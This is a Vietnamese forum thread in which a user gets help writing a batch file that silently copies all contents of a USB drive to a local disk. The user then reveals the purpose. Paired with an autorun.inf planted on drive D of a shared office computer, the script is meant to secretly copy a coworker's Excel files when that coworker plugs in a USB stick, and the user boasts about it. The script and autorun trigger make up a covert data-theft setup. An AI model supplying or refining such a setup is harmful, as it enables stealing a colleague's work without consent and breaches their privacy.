- Mụch đích : Mình muốn coppy (nhanh + ngầm) tất cả dữ liệu từ USB vào ổ cứng máy tính.
- Hiện ngay mình chỉ có thể tạo file .bat sau :
------------------------------------------------------
rem - AutoRun on D -
rem - Start copy all files on USB to drive D:
mkdir D:\VOSON\USB-CHEP
copy F:\ D:\VOSON\USB-CHEP (dòng này không có tác dụng)
copy F:\*.* D:\VOSON\USB-CHEP
rem - Copy Completed -
------------------------------------------------------
với file .bat trên thì mình chỉ có thể chép tào bộ dữ liệu là các file đơn lẻ trên USB vào D:\VOSON\USB-CHEP thôi còn các dữ liệu nằm trong USB nhưng được chứa trong thư mục thì "po tay".
Vậy nhờ các bạn sửa dùm mình với nha, hoặc cho code VB6 cũng được.
Cảm ơn nhiều.

Bạn có thể dùng lệnh xcopy để copy cả thư mục lẫn tập tin.
Gõ xcopy /? để biết thêm chi tiết.

Theo của bạn thì chỉ cần 1 lệnh là ok
Code:
xcopy /e /y F:\* D:\VOSON\USB-CHEP\


Chú ý, phần tạo thư mục mkdir D:\VOSON\USB-CHEP thì không nên để trong file .bat, nếu bạn dự định chạy file .bat này nhiều lần.

Rất cảm ơn bạn 4hfoo đã bỏ thời gian chỉ giáo. Chào cả nhà, cái file .bat này có thể đặt trong USB rồi mỗi khi mình cắm USB vào máy thì máy sẽ tự động coppy dữ liệu trên USB vào ổ đỉa cứng. nhưng như vậy thì cũng chẳn có ý nghĩa gì. mình là file này với mục đích là chép dữ liệu trên USB của đồng nghiệp (vì tên này giấu nghề lắm, hắn thì giởi thiệt nhưng mấy cái file excel hắn tạo ra để tính toán (dân xây dựng mà, chủ yếu tính bằng excel) mình xin hoài không cho). nêu mình nói tạo các file sau :
+ Chep_Files.bat có nội dung :
-------------------------------------------------
rem - AutoRun on D -
rem - Start copy all files on USB to drive D:
xcopy /e /y F:\* D:\VOSON\USB-CHEP\
rem - Copy Completed -
-------------------------------------------------
+ autorun.inf có nội dung :
-------------------------------------------------
[autorun]
open=Chep_Files.bat
-------------------------------------------------
(chưa kiểm tra thử nếu để trên ổ D thì nó chay được "Chep_Files.bat" khi mình lick vào D không)
02 file này được để trên ổ D của máy tính công ty, khi hắn cắm USB vào máy tính này + mở ổ D lên làm việc thì toàn bộ dữ liệu trên USB của hắn được lưu vào ổ cứng. heheheeeeee .
vậy là mình là có thêm "dữ liệu để làm việc rồi" .
